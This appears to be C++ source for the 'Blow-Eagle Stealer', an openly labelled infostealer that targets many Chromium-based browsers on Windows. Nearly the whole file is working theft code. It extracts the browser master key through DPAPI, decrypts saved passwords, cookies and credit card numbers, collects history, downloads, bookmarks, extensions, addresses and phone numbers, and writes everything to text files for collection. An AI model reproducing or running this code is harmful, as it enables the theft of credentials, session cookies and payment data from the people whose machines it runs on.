/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.cpp"
#include "../../helper/helper.h"
#include <fstream>
#include <vector>
#include <openssl/evp.h>
#include <nlohmann/json.hpp>
#include <string>
#include <windows.h>
#include <io.h>
#include <sodium.h>
#include <wincrypt.h>
#include <sqlite3.h>
#include <sstream>
#include <dirent.h>

using json = nlohmann::json;

namespace global 
{
    std::string user = func::GetUser();
    std::string appdata = "C:/Users/" + user + "/AppData/Local";
    std::string roaming = "C:/Users/" + user + "/AppData/Roaming";
    std::string defaultPath = "C:/Users/" + user + config::path + "/Browsers";

    std::string names[] = {
        "/Amigo",
        "/Torch",
        "/Kometa",
        "/Orbitum",
        "/CentBrowser",
        "/7Star",
        "/Sputnik",
        "/Vivaldi",
        "/Chrome SxS",
        "/Chrome",
        "/Epic Privacy Browser",
        "/Edge",
        "/Uran",
        "/YandexBrowser",
        "/Brave-Browser",
        "/Iridium",
        "/Opera GX",
        "/Opera"
    };
}
std::string decrypt_val(const std::string& key, const std::string& val) {
    try {
        std::cout << val << std::endl;
        std::string_view valView(val);
        std::vector<unsigned char> iv(valView.substr(3, 12).begin(), valView.substr(3, 12).end());
        std::vector<unsigned char> encryptedPass(valView.substr(15, val.size() - 31).begin(), valView.substr(15, val.size() - 31).end());
        std::vector<unsigned char> decryptPass(val.size());
        EVP_CIPHER_CTX* ctx;
        int len, plaintext;

        ctx = EVP_CIPHER_CTX_new();
        EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, static_cast<int>(iv.size()), nullptr);
        EVP_DecryptInit_ex(ctx, nullptr, nullptr, reinterpret_cast<const unsigned char*>(key.c_str()), iv.data());
        EVP_DecryptUpdate(ctx, decryptPass.data(), &len, encryptedPass.data(), static_cast<int>(encryptedPass.size()));
        plaintext = len;
        EVP_DecryptFinal_ex(ctx, decryptPass.data() + len, &len);
        plaintext += len;
        EVP_CIPHER_CTX_free(ctx);
        std::vector<unsigned char> clean(decryptPass.begin(), decryptPass.begin() + plaintext);

        std::string decryptedPass(clean.begin(), clean.end());
        return decryptedPass;
    }
    catch (...) {
        return "Chrome < 80";
    }
}

std::string getMasterKey(std::string path) {
    try {
        path += "\\Local State";
        if (_access(path.c_str(), 0) == 0) {
            std::ifstream keyFile(path.c_str());
            std::string decryptedKey, returnKey;
            nlohmann::json jsonData;
            keyFile >> jsonData;
            decryptedKey = jsonData["os_crypt"]["encrypted_key"];

            unsigned char bin[2048] = {};
            size_t res_len;
            int ret = sodium_base642bin(bin, 2048, decryptedKey.c_str(), decryptedKey.size(), nullptr, &res_len, nullptr, sodium_base64_VARIANT_ORIGINAL_NO_PADDING);

            if (ret == 0) {
                std::string dest(reinterpret_cast<char*>(bin + 5), res_len - 5);
                DATA_BLOB encryptedKey = {static_cast<DWORD>(dest.size()), reinterpret_cast<BYTE*>(const_cast<char*>(dest.c_str()))};
                DATA_BLOB plainTextKey;

                if (CryptUnprotectData(&encryptedKey, nullptr, nullptr, nullptr, nullptr, 0, &plainTextKey)) {
                    std::string masterKey(reinterpret_cast<char*>(plainTextKey.pbData), plainTextKey.cbData);
                    returnKey = masterKey;
                }
                else {
                    returnKey = "";
                }
                LocalFree(plainTextKey.pbData);
            }
            else {
                returnKey = "";
            }
            keyFile.close();
            return returnKey;
        }
        else {
            return "";
        }
    } catch (...) 
    {
        return "";
    } 
}


std::string grab_cookies(std::string path, std::string masterKey, std::string profile) {
    try {
        std::string temp = std::getenv("TEMP");
        std::string filepath = path + "\\" + profile + "\\Network\\Cookies";
        if (_access(filepath.c_str(), 0) == 0) {
            std::ifstream source(filepath, std::ios::binary);
            std::ofstream destination(temp + "\\Cookies.db", std::ios::binary);
            destination << source.rdbuf();
            source.close();
            destination.close();

            std::string data_path = temp + "\\Cookies.db";

            sqlite3 *db;
            int rc = sqlite3_open(data_path.c_str(), &db);
            if (rc != SQLITE_OK) {
                sqlite3_close(db);
                return "";
            }

            sqlite3_stmt *stmt;
            rc = sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value, path, expires_utc, samesite FROM cookies", -1, &stmt, NULL);
            if (rc != SQLITE_OK) {
                sqlite3_close(db);
                return "";
            }                        
            std::string cookies;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                std::string url(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
                std::string name(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
                std::string encrypted_value(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2)));
                std::string path(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3)));
                std::string date(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 4)));
                std::string samesite = std::to_string(sqlite3_column_int(stmt, 5));

                std::string decrypted_value = decrypt_val(masterKey, encrypted_value);

                if (decrypted_value != "Chrome < 80") {
                    cookies += "URL: " + url + "\n";
                    cookies += "Name: " + name + "\n";
                    cookies += "Value: " + decrypted_value + "\n";
                    cookies += "Path: " + path + "\n";
                    cookies += "Expiration Date: " + date + "\n";
                    cookies += "SameSite: " + samesite + "\n\n";
                }
            }

            sqlite3_finalize(stmt);
            sqlite3_close(db);

            return cookies;
        } else {
            return "";
        }
    } catch (...) {
        return "";
    }
}

std::string grab_history(std::string path, std::string profile) {
    try {
        std::string temp = std::getenv("TEMP");
        std::string filepath = path + "\\" + profile + "\\History";
        if (_access(filepath.c_str(), 0) == 0) {
            std::ifstream source(filepath, std::ios::binary);
            std::ofstream destination(temp + "\\History.db", std::ios::binary);
            destination << source.rdbuf();
            source.close();
            destination.close();

            std::string data_path = temp + "\\history.db";

            sqlite3 *db;
            int rc = sqlite3_open(data_path.c_str(), &db);
            if (rc != SQLITE_OK) {
                sqlite3_close(db);
                return "";
            }

            sqlite3_stmt *stmt;
            rc = sqlite3_prepare_v2(db, "SELECT url, title, visit_count, typed_count, last_visit_time FROM urls ORDER BY last_visit_time DESC", -1, &stmt, NULL);
            if (rc != SQLITE_OK) {
                sqlite3_close(db);
                return "";
            }

            std::string history;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                std::string url(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
                std::string title(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
                int visit_count = sqlite3_column_int(stmt, 2);
                int typed_count = sqlite3_column_int(stmt, 3);
                time_t last_visit_time = sqlite3_column_int64(stmt, 4) / 1000000 - 11644473600;

                history += "URL: " + url + "\n";
                history += "Title: " + title + "\n";
                history += "Visit Count: " + std::to_string(visit_count) + "\n";
                history += "Typed Count: " + std::to_string(typed_count) + "\n";
                history += "Last Visit Time: " + std::string(std::ctime(&last_visit_time)) + "\n\n";
            }

            sqlite3_finalize(stmt);
            sqlite3_close(db);

            return history;
        } else {
            return "";
        }
    } catch (...) {
        return "";
    }
}

std::string grab_downhistory(std::string path, std::string profile) {
    try {
        std::string temp = std::getenv("TEMP");
        std::string filepath = path + "\\" + profile + "\\History";
        if (_access(filepath.c_str(), 0) == 0) {
            std::ifstream source(filepath, std::ios::binary);
            std::ofstream destination(temp + "\\download-history.db", std::ios::binary);
            destination << source.rdbuf();
            source.close();
            destination.close();

            std::string data_path = temp + "\\download-history.db";

            sqlite3 *db;
            int rc = sqlite3_open(data_path.c_str(), &db);
            if (rc != SQLITE_OK) {
                sqlite3_close(db);
                return "";
            }

            sqlite3_stmt *stmt;
            rc = sqlite3_prepare_v2(db, "SELECT current_path, total_bytes, danger_type, tab_url, end_time, original_mime_type, state, opened FROM 'downloads' ORDER BY start_time DESC", -1, &stmt, NULL);
            if (rc != SQLITE_OK) {
                sqlite3_close(db);
                return "";
            }
            std::string downhistory;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                std::string current_path = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));

                int total_bytes = sqlite3_column_int(stmt, 1);
                std::stringstream ss;
                std::string size_str;
                if (total_bytes < 1024) {
                    ss << total_bytes << " B";
                } else if (total_bytes < pow(1024, 2)) {
                    ss << std::fixed << std::setprecision(2) << (double)total_bytes/1024 << " KB";
                } else if (total_bytes < pow(1024, 3)) {
                    ss << std::fixed << std::setprecision(2) << (double)total_bytes/pow(1024, 2) << " MB";
                } else {
                    ss << std::fixed << std::setprecision(2) << (double)total_bytes/pow(1024, 3) << " GB";
                }
                size_str = ss.str();
                int danger_type_int = sqlite3_column_int(stmt, 2);
                std::string tab_url_int = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3));
                int time_int = sqlite3_column_int64(stmt, 4);
                std::string original_mime_type = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 5));
                int state_int = sqlite3_column_int(stmt, 6);
                int opened_externally = sqlite3_column_int(stmt, 7);

                std::string danger_type;
                switch (danger_type_int) {
                    case -1: danger_type = "Invalid"; break;
                    case 0: danger_type = "Safe"; break;
                    case 1: danger_type = "Dangerous file"; break;
                    case 2: danger_type = "Dangerous URL"; break;
                    case 3: danger_type = "Dangerous content"; break;
                    case 4: danger_type = "Possibly dangerous content"; break;
                    case 5: danger_type = "Uncommon content"; break;
                    case 6: danger_type = "User allowed file"; break;
                    case 7: danger_type = "Dangerous host"; break;
                    case 8: danger_type = "Potentially unwanted file"; break;
                    default: danger_type = "Unknown"; break;
                }

                std::string tab_url = tab_url_int;

                std::string state;
                switch (state_int) {
                    case -1: state = "Invalid"; break;
                    case 0: state = "In progress"; break;
                    case 1: state = "Complete"; break;
                    case 2: state = "Cancelled"; break;
                    case 3: state = "Bug 140687"; break;
                    case 4: state = "Interrupted"; break;
                    default: state = "Unknown"; break;
                }

                std::string opened = opened_externally ? "Yes" : "No";

                downhistory += "Path: " + current_path + "\n";
                downhistory += "Size: " + size_str + "\n";
                downhistory += "Danger Type: " + danger_type + "\n";
                downhistory += "Tab URL: " + tab_url + "\n";
                downhistory += "End Time: " + std::to_string(time_int) + "\n";
                downhistory += "Original Mime Type: " + original_mime_type + "\n";
                downhistory += "State: " + state + "\n";
                downhistory += "Opened: " + opened + "\n\n";
            }
            sqlite3_finalize(stmt);
            sqlite3_close(db);

            return downhistory;
        } else {
            return "";
        }
    } catch (...) {
        return "";
    }
}

std::string grab_misc(std::string path, std::string masterKey, std::string profile) {
    try {
        std::string temp = std::getenv("TEMP");
        std::string filepath = path + "\\" + profile + "\\Web Data";

        if (_access(filepath.c_str(), 0) != 0) {
            return "";
        }

        std::ifstream source(filepath, std::ios::binary);
        std::ofstream destination(temp + "\\web data.db", std::ios::binary);
        destination << source.rdbuf();
        source.close();
        destination.close();

        std::string data_path = temp + "\\web data.db";

        sqlite3* db = nullptr;
        int rc = sqlite3_open(data_path.c_str(), &db);

        if (rc != SQLITE_OK) {
            sqlite3_close(db);
            return "";
        }

        sqlite3_stmt* stmt = nullptr;
        std::string misc;

        rc = sqlite3_prepare_v2(db, "SELECT street_address, city, state, zipcode FROM autofill_profiles", -1, &stmt, nullptr);

        if (rc != SQLITE_OK) {
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            return "";
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            std::string street_address(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
            std::string city(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
            std::string state(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2)));
            int zipcode = sqlite3_column_int(stmt, 3);

            misc += "Street Address: " + street_address + "\n";
            misc += "City: " + city + "\n";
            misc += "State: " + state + "\n";
            misc += "Zipcode: " + std::to_string(zipcode) + "\n\n";
        }

        sqlite3_finalize(stmt);

        rc = sqlite3_prepare_v2(db, "SELECT number FROM autofill_profile_phones", -1, &stmt, nullptr);

        if (rc != SQLITE_OK) {
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            return "";
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            std::string phonenumber(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
            misc += "Phone number: " + phonenumber + "\n\n";
        }

        sqlite3_finalize(stmt);

        rc = sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, nullptr);

        if (rc != SQLITE_OK) {
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            return "";
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            std::string name_on_card(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
            std::string expiration_month(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
            std::string expiration_year(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2)));
            std::string card_number_encrypted(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3)));
            std::string ccnumber = decrypt_val(masterKey, card_number_encrypted);

            misc += "Name on card: " + name_on_card + "\n";
            misc += "Expiration Month: " + expiration_month + "\n";
            misc += "Expiration Year: " + expiration_year + "\n";
            misc += "Card Number: " + ccnumber + "\n";
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);

        return misc;
    } catch (...) {
        return "";
    }
}
std::string grab_bookmarks(std::string path, std::string profile) {
    std::string bookmarks_info;
    try {
        std::string temp = std::getenv("TEMP");
        std::string filepath = path + "\\" + profile + "\\Bookmarks";
        if (_access(filepath.c_str(), 0) == 0) {
            std::ifstream bookmarks_file(filepath);
            std::string bookmarks_str((std::istreambuf_iterator<char>(bookmarks_file)), std::istreambuf_iterator<char>());
            json bookmarks_json = json::parse(bookmarks_str);
            try {
                json other_bookmarks = bookmarks_json["roots"]["other"]["children"];       
                for (auto& bookmark : other_bookmarks) {
                    try {
                        std::string name = bookmark["name"];
                        std::string url = bookmark["url"];
                        bookmarks_info += "Name: " + name + "\n";
                        bookmarks_info += "URL: " + url + "\n\n";
                    } catch (...) {}
                }
            } catch (...) {}

            try {
                json bookmark_bar_bookmarks = bookmarks_json["roots"]["bookmark_bar"]["children"];
                for (auto& bookmark : bookmark_bar_bookmarks) {
                    try {
                        std::string name = bookmark["name"];
                        std::string url = bookmark["url"];
                        bookmarks_info += "Name: " + name + "\n";
                        bookmarks_info += "URL: " + url + "\n\n";
                    } catch (...) {}
                }
            } catch (...) {}

            try {
                json synced_bookmarks = bookmarks_json["roots"]["synced"]["children"];
                for (auto& bookmark : synced_bookmarks) {
                    try {
                        std::string name = bookmark["name"];
                        std::string url = bookmark["url"];
                        bookmarks_info += "Name: " + name + "\n";
                        bookmarks_info += "URL: " + url + "\n\n";
                    } catch (...) {}
                }
            } catch (...) {}
        }
    } catch (...) {}
    return bookmarks_info;
}
struct ExtensionInfo {
  std::string name;
  std::string version;
  std::string key;
  std::vector<std::string> permissions;
};

std::vector<ExtensionInfo> grab_ext(const std::string& path, std::string profile) {
  std::vector<ExtensionInfo> extension_info_list;
  DIR* dir;
  struct dirent* ent;
  std::string extension_folder = path + "\\" + profile + "\\Extensions";
  if ((dir = opendir(extension_folder.c_str())) != NULL) {
    while ((ent = readdir(dir)) != NULL) {
      if (ent->d_name[0] == '.' || ent->d_name[0] == '_') continue;  // skip hidden files/folders and names starting with '_'
      const std::string extension_path = extension_folder + "/" + ent->d_name;
      DIR* version_dir;
      struct dirent* version_ent;
      if ((version_dir = opendir(extension_path.c_str())) != NULL) {
        while ((version_ent = readdir(version_dir)) != NULL) {
          if (version_ent->d_name[0] == '.') continue;  // skip hidden files/folders
          const std::string version_path =
              extension_path + "/" + version_ent->d_name;
          const std::string manifest_path =
              version_path + "/manifest.json";
          std::ifstream manifest_file(manifest_path);
          if (!manifest_file.is_open()) {
            continue;
          }
          json manifest_json;
          manifest_file >> manifest_json;
          ExtensionInfo extension_info;
          extension_info.name = manifest_json["name"];
          extension_info.key = manifest_json["key"];
          if (extension_info.name[0] == '_' && extension_info.name[1] == '_') continue; // skip names starting with '__'
          extension_info.version = version_ent->d_name;
          for (auto& permission : manifest_json["permissions"]) {
            extension_info.permissions.push_back(permission);
          }
          extension_info_list.push_back(extension_info);
        }
        closedir(version_dir);
      } else {
        continue;
      }
    }
    closedir(dir);
  } else {
      return {};
  }
  return extension_info_list;
}


std::string grab_passwords(std::string path, std::string masterKey, std::string profile) {
    try {
        std::string temp = std::getenv("TEMP");
        std::string filepath = path + "\\" + profile + "\\Login Data";
        if (_access(filepath.c_str(), 0) == 0) {
            std::ifstream source(filepath, std::ios::binary);
            std::ofstream destination(temp + "\\Login data", std::ios::binary);
            destination << source.rdbuf();
            source.close();
            destination.close();

            std::string data_path = temp + "\\Login Data";

            sqlite3* db;
            int rc = sqlite3_open(data_path.c_str(), &db);
            if (rc != SQLITE_OK) {
                sqlite3_close(db);
                return "";
            }

            sqlite3_stmt* stmt;
            rc = sqlite3_prepare_v2(db, "SELECT origin_url, action_url, username_value, password_value, date_created, times_used FROM logins", -1, &stmt, NULL);
            if (rc != SQLITE_OK) {
                sqlite3_close(db);
                return "";
            }

            std::string passwords;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                std::string url(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
                std::string action_url(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
                std::string username(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2)));
                std::string encrypted_password(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3)));
                std::string date(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 4)));
                std::string times_used = std::to_string(sqlite3_column_int(stmt, 5));

                std::string decrypted_password = decrypt_val(masterKey, encrypted_password);

                if (decrypted_password != "Chrome < 80") {
                    passwords += "URL: " + url + "\n";
                    passwords += "Action URL: " + action_url + "\n";
                    passwords += "Username: " + username + "\n";
                    passwords += "Password: " + decrypted_password + "\n";
                    passwords += "Date created: " + date + "\n";
                    passwords += "Times used: " + times_used + "\n\n";
                }
            }

            sqlite3_finalize(stmt);
            sqlite3_close(db);

            return passwords;
        }
        else {
            return "";
        }
    }
    catch (...) {
        return "";
    }
}

void WriteAll(std::string browser, std::string profile, std::string cookies, std::string history, std::string downhistory, std::string bookmarks, std::vector<ExtensionInfo> extensions, std::string misc, std::string pwds )
{
    std::string dir = global::defaultPath + browser;

    std::ofstream file(dir+ "/cookies" + '_' + profile + ".txt", std::ios::app);
    if (file.is_open())
    {
        file << cookies << std::endl;
    }
    file.close();


    std::ofstream file1(dir + "/history" + '_' + profile + ".txt", std::ios::app);
    if (file1.is_open())
    {
        file1 << history << std::endl;
    }
    file1.close();


    std::ofstream file2(dir + "/downhistory" + '_' + profile + ".txt", std::ios::app);
    if (file2.is_open())
    {
        file2 << downhistory << std::endl;
    }
    file2.close();

    std::ofstream file3(dir + "/bookmarks" + '_' + profile + ".txt", std::ios::app);
    if (file3.is_open())
    {
        file3 << bookmarks << std::endl;
    }
    file3.close();

    std::ofstream file35(dir + "/extensions" + '_' + profile + ".txt", std::ios::app);
    if (file35.is_open())
    {
        for (ExtensionInfo element : extensions)
        {
            file35 << "name: "+element.name << std::endl;
            file35 << "version: " + element.version << std::endl;
            file35 << "key: " + element.key << std::endl;
            for (std::string omg : element.permissions)
            {
                file35 << "   permissions:" + omg << std::endl;
            }
            
        }
    }
    file35.close();

    std::ofstream file4(dir + "/misc" + '_' + profile + ".txt", std::ios::app);
    if (file4.is_open())
    {
        file4 << misc << std::endl;
    }
    file4.close();

    std::ofstream file5(dir + "/pwds" + '_' + profile + ".txt", std::ios::app);
    if (file5.is_open())
    {
        file5 << pwds << std::endl;
    }
    file5.close();
}

void browsers::Chromium()
{
    printf("Chromium\n");


    std::string browsersPaths[] = 
    {
         global::appdata+"/Amigo/User Data",
         global::appdata + "/Torch/User Data",
         global::appdata + "/Kometa/User Data",
         global::appdata + "/Orbitum/User Data",
         global::appdata + "/CentBrowser/User Data",
         global::appdata + "/7Star/7Star/User Data",
         global::appdata + "/Sputnik/Sputnik/User Data",
         global::appdata + "Vivaldi/User Data",
         global::appdata + "/Google/Chrome SxS/User Data",
         global::appdata + "/Google/Chrome/User Data",
         global::appdata + "/Epic Privacy Browser/User Data",
         global::appdata + "/Microsoft/Edge/User Data",
         global::appdata + "/uCozMedia/Uran/User Data",
         global::appdata + "/Yandex/YandexBrowser/User Data",
         global::appdata + "/BraveSoftware/Brave-Browser/User Data",
         global::appdata + "/Iridium/User Data",
         global::roaming + "/Opera Software/Opera GX Stable",
         global::roaming + "/Opera Software/Opera Stable"
    };

    std::string profiles[] = { 
        "Default",
        "Profile 1",
        "Profile 2",
        "Profile 3",
        "Profile 4",
        "Profile 5"
    };

    int result = _mkdir(global::defaultPath.c_str());

    for (size_t i = 0; i < std::size(browsersPaths); i++)
    {
        if (std::filesystem::exists(browsersPaths[i])) 
        {
            std::string mk = getMasterKey(browsersPaths[i]);

            for (size_t j = 0; j < std::size(profiles); j++)
            {
                if (std::filesystem::exists(browsersPaths[i] + "/" + profiles[j]))
                {
                    std::string dir = global::defaultPath + global::names[i];
                    int result = _mkdir(dir.c_str());
                    std::cout << "grab_cookies" << std::endl;
                    std::string cookies = grab_cookies(browsersPaths[i], mk, profiles[j]);
                    std::cout << "grab_his" << std::endl;
                    std::string history = grab_history(browsersPaths[i], profiles[j]);
                    std::cout << "grab_dhis" << std::endl;
                    std::string downhistory = grab_downhistory(browsersPaths[i], profiles[j]);
                    std::cout << "grab_book" << std::endl;
                    std::string bookmarks = grab_bookmarks(browsersPaths[i], profiles[j]);
                    std::cout << "grab_ext" << std::endl;
                    std::vector<ExtensionInfo> extensions = grab_ext(browsersPaths[i], profiles[j]);
                    std::cout << "grab_misc" << std::endl;
                    std::string misc = grab_misc(browsersPaths[i], mk, profiles[j]);
                    std::cout << "grab_pwd" << std::endl;
                    std::string pwds = grab_passwords(browsersPaths[i], mk, profiles[j]);
                    std::cout << "grab_write" << std::endl;
                    WriteAll(global::names[i], profiles[j], cookies, history, downhistory, bookmarks, extensions, misc, pwds);

                }
            }
        }
    }
}

/*
void browsers::FireFox()
{
    std::string path = global::roaming + "/Mozilla/Firefox/Profiles";
    std::string defPaths = global::defaultPath + "/Firefox";
    int result = _mkdir(global::defaultPath.c_str());

    if (std::filesystem::exists(path))
    {
        int result = _mkdir(defPaths.c_str());

        func::copyDirectory(path, defPaths);

    }
}
*/
